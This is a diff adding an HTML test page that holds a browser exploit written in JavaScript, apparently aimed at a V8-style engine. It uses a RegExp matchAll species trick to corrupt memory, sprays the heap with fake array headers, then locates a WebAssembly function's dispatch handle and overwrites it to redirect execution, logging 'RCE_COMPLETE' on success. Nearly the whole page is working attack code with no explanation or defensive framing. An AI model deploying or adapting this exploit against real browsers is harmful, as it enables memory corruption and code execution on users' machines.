@@ -1,0 +1,87 @@
+<!doctype html><html><head><meta charset="utf-8"><title>P80</title></head>
+<body><pre id="out">Running...</pre>
+<script>
+"use strict";
+const O=document.getElementById("out");
+function log(s){O.textContent+="\n"+s;}
+const cvt=new ArrayBuffer(8);const f64=new Float64Array(cvt);
+const u64=new BigUint64Array(cvt);const u32=new Uint32Array(cvt);
+function i2f(i){u64[0]=BigInt.asUintN(64,BigInt(i));return f64[0];}
+function f2i(f){f64[0]=f;return u64[0];}
+function flo(f){f64[0]=f;return u32[0];}
+function fhi(f){f64[0]=f;return u32[1];}
+function w2f(lo,hi){u32[0]=lo>>>0;u32[1]=hi>>>0;return f64[0];}
+function trash(n){for(let i=0;i<n;i++)new Array(0x400).fill(1.1);}
+const DMAP=0x1032a5d,EMPTY=0x7e5,MAXS=0x7fdffffe,PIN=0x1080011;
+const marker={mmm:1},marker2={zzz:2};
+const objB=new Array(0x8000);
+for(var i=0;i<objB.length;i++)objB[i]=marker;
+// 2-function wasm: f0=42, f1=1337. JDT entry size = 16 bytes (code+params)
+const wasmI=new WebAssembly.Instance(new WebAssembly.Module(new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,3,2,0,0,7,5,1,1,102,0,0,10,12,2,4,0,65,42,11,5,0,65,185,10,11])));
+objB[4]=wasmI;
+const re=/(?:)/;
+const fk={flags:"g",lastIndex:1073741823,constructor:{[Symbol.species]:function(){return re;}}};
+const c0=w2f(DMAP,EMPTY);
+const sk=[];
+log("UA: "+navigator.userAgent);
+log("PRE:"+wasmI.exports.f());
+trash(230);trash(230);
+objB[4]=wasmI;objB[5]=marker;
+RegExp.prototype[Symbol.matchAll].call(fk,"").next();
+log("TRIG: "+re.lastIndex);
+trash(230);trash(230);
+for(let r=0;r<3;r++){const c1=w2f(PIN,MAXS);for(let i=0;i<12;i++){const a=new Array(i&1?0x3ffb:0x3fff).fill(c0);for(let j=1;j<a.length;j+=2)a[j]=c1;sk.push(a);}}
+try{
+const m=re.lastIndex;
+if(!Array.isArray(m)){log("NA");log("=== DONE ===");throw 0;}
+log("A=true");
+const cands=[];
+for(let k=0x8000;k<0x10010;k++){
+  try{const v=f2i(m[k]);const lo=v&0xffffffffn,hi=v>>32n;
+    if(lo===hi&&(lo&1n)===1n&&lo>0x100000n){if(f2i(m[k+1])===v){const v3=f2i(m[k+2]);const w=v3&0xffffffffn;if(w!==lo&&(w&1n)===1n&&w>0x100n){cands.push(k);}}}}catch(e){break;}
+  if(cands.length>=6)break;
+}
+let OB=-1;
+for(const k of cands){const b=f2i(m[k+2]);objB[4]=marker2;const a=f2i(m[k+2]);objB[4]=marker;if(a!==b){OB=k;break;}}
+if(OB>=0){
+  log("OB:"+OB.toString(16));
+  objB[4]=wasmI.exports.f;const fA=Number(f2i(m[OB+2])&0xffffffffn);objB[4]=marker;
+  log("F:"+fA.toString(16));
+  const fR=fA&0xFFFFFFFE;
+  // Read JSFunction QWORD 2 which contains dispatch_handle
+  // dispatch_handle offset is at JSFunction byte 16
+  const off2=fR+16-0x1080018;const idx2=Math.floor(off2/8);
+  const lo2=flo(m[idx2]),hi2=fhi(m[idx2]);
+  log("Q2:"+lo2.toString(16)+"|"+hi2.toString(16));
+  // One of lo2/hi2 is the dispatch_handle. It's a large value like 0x1AEE00
+  // JDT entry size is 16 bytes. Function 1's entry = dispatch_handle + 16
+  // Try: change dispatch_handle by +16 → redirects to function 1 (returns 1337)
+  const dh=(lo2>0x100000&&lo2<0x1000000)?lo2:
+           (hi2>0x100000&&hi2<0x1000000)?hi2:0;
+  const dhInLo=(lo2===dh);
+  if(dh>0){
+    log("DH:"+dh.toString(16)+(dhInLo?" lo":" hi"));
+    log("PRE:"+wasmI.exports.f());
+    // Try dispatch_handle + 16 (next JDT entry = function 1)
+    if(dhInLo){m[idx2]=w2f(dh+16,hi2);}
+    else{m[idx2]=w2f(lo2,dh+16);}
+    try{
+      const nv=wasmI.exports.f();
+      log("POST_16:"+nv);
+      if(nv===1337){log("RCE_COMPLETE");throw 0;}
+      if(nv!==42){log("CHANGED:"+nv);throw 0;}
+    }catch(e){
+      if(e===0)throw 0;
+      log("CRASH_16");
+    }
+    // Restore
+    if(dhInLo){m[idx2]=w2f(dh,hi2);}
+    else{m[idx2]=w2f(lo2,dh);}
+  }else{
+    log("NO_DH q2:"+lo2.toString(16)+"|"+hi2.toString(16));
+  }
+}else{log("STALE");}
+}catch(e){if(e!==0)log("E: "+e.message);}
+log("W: "+wasmI.exports.f());
+log("=== DONE ===");
+</script></body></html>
